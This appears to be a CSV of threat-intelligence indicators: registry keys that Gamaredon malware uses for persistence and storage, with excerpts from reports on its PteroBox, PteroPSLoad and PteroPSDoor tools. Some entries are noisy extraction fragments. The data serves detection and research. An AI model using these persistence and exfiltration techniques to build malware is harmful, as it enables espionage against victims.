1.0.0,actor--gamaredon,artifact--sha256:982cf54936618c2d3efe5ca851bc49a65725546ea42a71c73c873ff29e0c8766,observation--sha256:c5b525e0c8c6065b9762f179d2028d17b955b472b3c259be31e12f53fe1e2714,registry-key,HKCU\Environment\UserInitMprLogonScript .,HKCU\Environment\UserInitMprLogonScript,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"15 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 The payload, a PE file XOR encrypted with a system -specific key (the volume serial number previously sent to the C&C server) , is decrypted and dropped into the same directory with a .exe extension . The payload is not executed right after it has been downloaded, but by the downloader on its next run before attempting to download another payload . The payload is not made persistent; it is just execu",
1.0.0,actor--gamaredon,artifact--sha256:7da53a4ae4d489a56713f65b9c525e231d808648bafd0b31a8bdd4b3932ee4cf,observation--sha256:f67a67f4620b668beecedc6abd12acd267eef8f65782b7f999102c7d6b9c7c23,registry-key,HKCU\Keyboard Layout \GetFileMD5,HKCU\Keyboard Layout \GetFileMD5,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"45 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \%USERNAME% \([a-zA-Z0-9]{19,25}): \1 Configuration paths HKCU\EUDC\[a-zA-Z0-9]{19,25} Mutexes Global \MutexLaos Global \MutexLaos1 Global \MutexNosa Global \MutexNosas Global \MutexTa Global \MutexTanos Global \MutexTanoss Global \MutexTest APPENDIX F: HOST -BASED ARTIFACTS ASSOCIATED WITH PTEROBOX Name Value Installation paths HKCU\Keyboard Layout \getListFile HKCU\Keyboard Layout \usb HKC",
1.0.0,actor--gamaredon,artifact--sha256:f32581c4375829d3c51fd371e9bd1814b39934e2075b4bf80e431cf60429c3ad,observation--sha256:4fb000b30b0ea1617e9b06ba5e3b0b5eaf45bfa656defa0bbe14eb99abbb9fc8,registry-key,HKCU\Keyboard Layout \getListFile,HKCU\Keyboard Layout \getListFile,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"45 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \%USERNAME% \([a-zA-Z0-9]{19,25}): \1 Configuration paths HKCU\EUDC\[a-zA-Z0-9]{19,25} Mutexes Global \MutexLaos Global \MutexLaos1 Global \MutexNosa Global \MutexNosas Global \MutexTa Global \MutexTanos Global \MutexTanoss Global \MutexTest APPENDIX F: HOST -BASED ARTIFACTS ASSOCIATED WITH PTEROBOX Name Value Installation paths HKCU\Keyboard Layout \getListFile HKCU\Keyboard Layout \usb HKC",
1.0.0,actor--gamaredon,artifact--sha256:500d8acc1547a5ecaf3977b53889ea91d61cd35d6ce298f9f304aa7aaa402975,observation--sha256:87b60944f2d82d1bfd5a4afc6aca48142ca0163f5517a618e7cbfcfc6ac3f921,registry-key,HKCU\Keyboard Layout \listPrepare,HKCU\Keyboard Layout \listPrepare,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"45 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \%USERNAME% \([a-zA-Z0-9]{19,25}): \1 Configuration paths HKCU\EUDC\[a-zA-Z0-9]{19,25} Mutexes Global \MutexLaos Global \MutexLaos1 Global \MutexNosa Global \MutexNosas Global \MutexTa Global \MutexTanos Global \MutexTanoss Global \MutexTest APPENDIX F: HOST -BASED ARTIFACTS ASSOCIATED WITH PTEROBOX Name Value Installation paths HKCU\Keyboard Layout \getListFile HKCU\Keyboard Layout \usb HKC",
1.0.0,actor--gamaredon,artifact--sha256:cf457f025e9824b224d7a9542ffb20edd2e1658f0d671598ba17cdd758eac3be,observation--sha256:8953c42e9ab33ed1cb229991c4f5299fcc2af7f011ae79d1a839f70352f4a7f0,registry-key,HKCU\Keyboard Layout \sendFile,HKCU\Keyboard Layout \sendFile,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"45 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \%USERNAME% \([a-zA-Z0-9]{19,25}): \1 Configuration paths HKCU\EUDC\[a-zA-Z0-9]{19,25} Mutexes Global \MutexLaos Global \MutexLaos1 Global \MutexNosa Global \MutexNosas Global \MutexTa Global \MutexTanos Global \MutexTanoss Global \MutexTest APPENDIX F: HOST -BASED ARTIFACTS ASSOCIATED WITH PTEROBOX Name Value Installation paths HKCU\Keyboard Layout \getListFile HKCU\Keyboard Layout \usb HKC",
1.0.0,actor--gamaredon,artifact--sha256:31f01e44c7827d954e77cfeec3d71a07644b84ae9e046dd60d68b952894d9e75,observation--sha256:ae3ba59cf5d043f1bea2323e93b88f72d3ee86f25a1779da73f1e840fdc7c1eb,registry-key,HKCU\Keyboard Layout \update,HKCU\Keyboard Layout \update,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"45 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \%USERNAME% \([a-zA-Z0-9]{19,25}): \1 Configuration paths HKCU\EUDC\[a-zA-Z0-9]{19,25} Mutexes Global \MutexLaos Global \MutexLaos1 Global \MutexNosa Global \MutexNosas Global \MutexTa Global \MutexTanos Global \MutexTanoss Global \MutexTest APPENDIX F: HOST -BASED ARTIFACTS ASSOCIATED WITH PTEROBOX Name Value Installation paths HKCU\Keyboard Layout \getListFile HKCU\Keyboard Layout \usb HKC",
1.0.0,actor--gamaredon,artifact--sha256:33205327adf538517e92ca65d60a2cd5e2d8d5206046b9359e121906ec259abf,observation--sha256:ded8ef713b4f403637c1a0b13078041e6d6daef4d242a4648ae003df64b83768,registry-key,HKCU\Keyboard Layout \update. Since then,HKCU\Keyboard Layout \update. Since then,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances PteroBox PteroBox is a known Gamaredon file stealer that we discovered at the end of 2024, and detailed in our Gamaredon 2024 white paper. During 2025, we discovered a new variant of PteroBox that uses the rclone utility to exfiltrate files to Dropbox; therefore, we named it the rclone variant. The API variant, as we now call the original variant, has been updated a few times throughout 2025, and both variants have ",
1.0.0,actor--gamaredon,artifact--sha256:237fcf9623d959897d96d58f83adb02b7f2598872f6bcba5c7c960b8a5f04644,observation--sha256:ba1111e90ba4f7352f73648ee128d9a35667bd68f061079005c292e27feec331,registry-key,HKCU\Keyboard Layout \usb,HKCU\Keyboard Layout \usb,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"45 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \%USERNAME% \([a-zA-Z0-9]{19,25}): \1 Configuration paths HKCU\EUDC\[a-zA-Z0-9]{19,25} Mutexes Global \MutexLaos Global \MutexLaos1 Global \MutexNosa Global \MutexNosas Global \MutexTa Global \MutexTanos Global \MutexTanoss Global \MutexTest APPENDIX F: HOST -BASED ARTIFACTS ASSOCIATED WITH PTEROBOX Name Value Installation paths HKCU\Keyboard Layout \getListFile HKCU\Keyboard Layout \usb HKC",
1.0.0,actor--gamaredon,artifact--sha256:81014e411aa6454fceeeabf79b839954bc50aff51595d1a169511e1259a87402,observation--sha256:39d2f5de7f6d0c9c0ff062a288e2cd7d9d0ea4bbec3fc98e86b265ce686bb214,registry-key,HKCU\Network . The aforementioned skeleton script,HKCU\Network . The aforementioned skeleton script,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"25 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 For both vari ants, we have only seen PteroDash being used as a downloader component of PteroTemplate. PteroDig PteroDig (SHA -1: 1AEAE7A567C71200BA804801C4CEC227D2B64414 ), which we discovered in November 2022, is a PowerShell tool that weaponizes selected Desktop LNK files. It drops a basic skeleton of a downloader to %USERPROFILE% and stores relevant parts of the downloader script in the registry ",
1.0.0,actor--gamaredon,artifact--sha256:2d30ecec001e02809eee50f582d30cb14beb61e65188387305347b091c2f86e4,observation--sha256:94031183d92b6c3f2dcda0f596e4f0eb2ac0d0f8662cbf5259dee2d579fb9832,registry-key,HKCU\Printers,HKCU\Printers,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"12 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Firstly, PteroPSLoad resolves the C&C server ’s IP address from the hardcoded domain by querying the default system DNS. Secondly, it uses that IP address to send an HTTP GET request with the /get.php URI to its C&C server to fetch its updated version . Thirdly, it ensures the persistence of the downloaded update by creating an HKCU Run value that will execute it upon every system start, serving as b",
1.0.0,actor--gamaredon,artifact--sha256:8419beea33db9056ec1cc2acbf885e8defbdfb928a8e307bb5bbe2607fb3f01b,observation--sha256:b451a2d54b6a1c5a51ba598bfdcb0b9dbfc634549aeab9c4a07387ac07016092,registry-key,HKCU\Printers . Finally,HKCU\Printers . Finally,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"12 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Firstly, PteroPSLoad resolves the C&C server ’s IP address from the hardcoded domain by querying the default system DNS. Secondly, it uses that IP address to send an HTTP GET request with the /get.php URI to its C&C server to fetch its updated version . Thirdly, it ensures the persistence of the downloaded update by creating an HKCU Run value that will execute it upon every system start, serving as b",
1.0.0,actor--gamaredon,artifact--sha256:280c5cc29db733d763799922027f79c1ed3c72fcf943a66f9fcea8e3c52492e8,observation--sha256:b3fc843c454f5fb18f9cb38d02a93a8c52d255eb0bb51967a1cf95b768c6549f,registry-key,HKCU\Printers . Upon execution,HKCU\Printers . Upon execution,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 This whole functionality was later removed from PteroPSLoad. account.php This version, in comparison to the previous one, contains two notable changes. The first in the persistence mechanism used, and the second in the way that it communicates with its C&C server. Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to %ALLUSERSPROFILE% and scheduling it to ",
1.0.0,actor--gamaredon,artifact--sha256:ef121afc1ab31cef3087249c9bebefdc70715bbb670bb421ce5598a97ac245b5,observation--sha256:d7f2d8c56e9e4c4ff36f6b8e3acc0b9ada91d375e7609e1e876c4a2b9c7c890d,registry-key,HKCU\Printers \[a-zA-Z0-9]{19,HKCU\Printers \[a-zA-Z0-9]{19,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 46}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"46 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value Mutexes %PROCESSOR_IDENTIFIER% %COMPUTERNAME% Scheduled task names dropbox %COMPUTERNAME% %COMPUTERNAME%_1 APPENDIX G: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPSDOOR Name Value Installation paths HKCU\Software \[a-zA-Z0-9]{19,25} HKCU\Abstractions \[a-zA-Z0-9]{19,25} HKCU\AppEvents \[a-zA-Z0-9]{19,25} HKCU\Printers \[a-zA-Z0-9]{19,25} %USERPROFILE% \%PROCESSOR_LEVEL%_%PROCESSOR_REVISION% \data\geoip %US",
1.0.0,actor--gamaredon,artifact--sha256:9bd12e9a2a6b5ef2bed5a5e0c961f6f0e5ef552b371388ff34e54fee403a7c87,observation--sha256:c96a49eeb6585de5bc5b365cbb2301d2e959d2c0269528c1b309b693544289ce,registry-key,HKCU\Printers \[a-z]{2,HKCU\Printers \[a-z]{2,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"44 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %APPDATA% \{ConnectedDevicesPlatform|Windows|Explorer }\desktoph %APPDATA% \{ConnectedDevicesPlatform|Windows|Explorer }\desktopr %APPDATA% \Logs\[a-zA-Z0-9]+ Scheduled task names MicrosoftEdgeUpdateTaskMachineUA MicrosoftEdgeUpdateTaskMachineCore MicrosoftUpdateTaskMachineUA MicrosoftUpdateTaskMachineCore Filenames для службового користування.lnk Прибуття.lnk Вибуття.lnk ФОТО.lnk Акти.lnk ЖБД.lnk Доповід",
1.0.0,actor--gamaredon,artifact--sha256:8d8e2ea5c1c53485fc78f1cbed110ae2f04864716c5aa8618b1b226509b74e14,observation--sha256:610d4704946412fc3f6e02a7386d63d438b4644b65a473f32c8d2c697b516c70,registry-key,HKCU\Printers  in October. Starting with the October  update,HKCU\Printers in October. Starting with the October update,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"24 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Capabilities PteroPSDoor’s main goal is to search all mapped drives for files with specific extensions, and subsequently exfiltrate such files to C&C servers or cloud storage accounts operated by Gamaredon. On March 1st, 2025, PteroPSDoor received quite an interesting update , in which Gamaredon added several fallback methods – probably to overcome network -based blocking. First, Gamaredon added a fallback upload me",
1.0.0,actor--gamaredon,artifact--sha256:b0a14331dc859e6383b5ae4662d13812e730d18ad630c7ba668b71e5d15d931e,observation--sha256:ff9222033435eb8fc2b4355cef93c09a082b73b03237ada279c940e12447b154,registry-key,HKCU\SOFTWARE\Microsoft\Office and looks for a,HKCU\SOFTWARE\Microsoft\Office and looks for a,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"28 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroScreen First seen by ESET Research in July 2022, PteroScreen (SHA-1: BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes screenshots of all screens and temporarily stores the image in %TEMP% \<randomNumber>.png . The screenshot is then base64 encoded and uploaded to the C&C server along with the system drive ’s volume serial number via an HTTP POST reques",
1.0.0,actor--gamaredon,artifact--sha256:bb6394807ce27badde8b466fdd578715639969c68b8a0a549ab0fc3299927e4f,observation--sha256:af35672f3029693eaa3126d827586b03bc6d8644c3f3e259d5c22d5f641363e0,registry-key,HKCU\Software \Microsoft \Windows \CurrentVersion \RunOnce \ExploitGuard,HKCU\Software \Microsoft \Windows \CurrentVersion \RunOnce \ExploitGuard,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"42 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \boot.ini:URLTeletype %USERPROFILE% \boot.ini:WindowsDetect %USERPROFILE% \boot.ini:URLTelegra %USERPROFILE% \boot.ini:WindowsTelegra %USERPROFILE% \boot.ini:URL %USERPROFILE% \boot.ini:IP HKCU\Console \URL HKCU\Console \IP Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DXGIAdapterCache HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DirectXDatabaseUpda ter HKC",
1.0.0,actor--gamaredon,artifact--sha256:7b54ad4afd88727c1f5ed58be3123ce3ce493016bdd65d2cb294942d44fa16fd,observation--sha256:281dedf3d76ac56a8195ab87044ed4e49845291173b7c376701b4186c9af0abe,registry-key,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME%,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME%,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 47}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"47 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME%_%USERNAM E% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERDOMAIN% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME%2 HKCU\Software \Microsoft \Windows \Curr",
1.0.0,actor--gamaredon,artifact--sha256:b1d1b5c5145505c7ec63fde41bd994d44e38ed56d920e03661a0eed9ddb45967,observation--sha256:d0311262dea10c811b57b99c639eed887e90320083629476e02a624604d9fed5,registry-key,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME%2,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME%2,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 47}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"47 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME%_%USERNAM E% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERDOMAIN% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME%2 HKCU\Software \Microsoft \Windows \Curr",
1.0.0,actor--gamaredon,artifact--sha256:5651dccf5249168641933eefcaef7fb692c3d5782d9322835cfa7d46ea704390,observation--sha256:8aca2c091f896d8a429bc2a0850c763f58865157c79819d3228c19e6588463a1,registry-key,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERDOMAIN%,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERDOMAIN%,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 47}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"47 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME%_%USERNAM E% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERDOMAIN% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME%2 HKCU\Software \Microsoft \Windows \Curr",
1.0.0,actor--gamaredon,artifact--sha256:11ad33d62e94ece00c5966da12f5fd6bc6e3ebbaf1396b644ab9a8fab3507b8e,observation--sha256:ff0ddf463f355a8924bdb8064683823ddbf6feae0d6a687ec98047f83a00f7b2,registry-key,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME%,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME%,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 47}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"47 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME%_%USERNAM E% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERDOMAIN% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME%2 HKCU\Software \Microsoft \Windows \Curr",
1.0.0,actor--gamaredon,artifact--sha256:d5a41b5d344da53e2fb0c64f423a9a43b5a93de14f4b1ce62fa8cf63ae4ee892,observation--sha256:b7691c5c279404c306dc2876ea10c939ab21a9c7724eed532ab2bc80a6bd8e17,registry-key,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME%_%USERNAM,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME%_%USERNAM,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 47}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"47 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME%_%USERNAM E% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERDOMAIN% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME%2 HKCU\Software \Microsoft \Windows \Curr",
1.0.0,actor--gamaredon,artifact--sha256:c66ce31c4f58255bbdefb30dd6bd15dfda41ecd08839ab6cf49f2d61a547a528,observation--sha256:4aee07ef799b54676b52add1b208de28bd63028072b92fbc0176aa2476444cd0,registry-key,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DXGIAdapterCache,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DXGIAdapterCache,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"42 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \boot.ini:URLTeletype %USERPROFILE% \boot.ini:WindowsDetect %USERPROFILE% \boot.ini:URLTelegra %USERPROFILE% \boot.ini:WindowsTelegra %USERPROFILE% \boot.ini:URL %USERPROFILE% \boot.ini:IP HKCU\Console \URL HKCU\Console \IP Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DXGIAdapterCache HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DirectXDatabaseUpda ter HKC",
1.0.0,actor--gamaredon,artifact--sha256:6d72f65317430ab902cd5799468037584e9ffedfc265e6f7d268fc86f4ac2bb2,observation--sha256:452582295df69f421daf70a24f9fd6b3f3178c950ae616daa71f931e19814e59,registry-key,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DirectXDatabaseUpda,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DirectXDatabaseUpda,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"42 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \boot.ini:URLTeletype %USERPROFILE% \boot.ini:WindowsDetect %USERPROFILE% \boot.ini:URLTelegra %USERPROFILE% \boot.ini:WindowsTelegra %USERPROFILE% \boot.ini:URL %USERPROFILE% \boot.ini:IP HKCU\Console \URL HKCU\Console \IP Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DXGIAdapterCache HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DirectXDatabaseUpda ter HKC",
1.0.0,actor--gamaredon,artifact--sha256:a0ff1385a318c15be4f5fc22cfc4392cef6e966119d505c06e59f087fbd50bdb,observation--sha256:f9bb59710bedcb09beac65c95e1a18369605a4dbb9082098d11702196a095ccc,registry-key,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\GooglePhone,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\GooglePhone,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 47}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"47 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME%_%USERNAM E% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERDOMAIN% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME%2 HKCU\Software \Microsoft \Windows \Curr",
1.0.0,actor--gamaredon,artifact--sha256:5263a5ec30b0b5625b7ce04c16ae7d153fb853c302b8ecc9402da3951f157a4e,observation--sha256:f9f363ced04303bfaa790be539eaac8a6098b7965c133630ac9c645fb37e3160,registry-key,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\Microsoft -Windows -,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\Microsoft -Windows -,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"42 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \boot.ini:URLTeletype %USERPROFILE% \boot.ini:WindowsDetect %USERPROFILE% \boot.ini:URLTelegra %USERPROFILE% \boot.ini:WindowsTelegra %USERPROFILE% \boot.ini:URL %USERPROFILE% \boot.ini:IP HKCU\Console \URL HKCU\Console \IP Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DXGIAdapterCache HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DirectXDatabaseUpda ter HKC",
1.0.0,actor--gamaredon,artifact--sha256:603bef153911342e146b62adfd327d171ba6ce38358866a0a7505a762cede284,observation--sha256:a812756df8dd90f948929dff15413ea644cd4f4dc89badbcbe4b1454569a11e2,registry-key,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\RecommendedTroubles,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\RecommendedTroubles,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"42 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \boot.ini:URLTeletype %USERPROFILE% \boot.ini:WindowsDetect %USERPROFILE% \boot.ini:URLTelegra %USERPROFILE% \boot.ini:WindowsTelegra %USERPROFILE% \boot.ini:URL %USERPROFILE% \boot.ini:IP HKCU\Console \URL HKCU\Console \IP Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DXGIAdapterCache HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DirectXDatabaseUpda ter HKC",
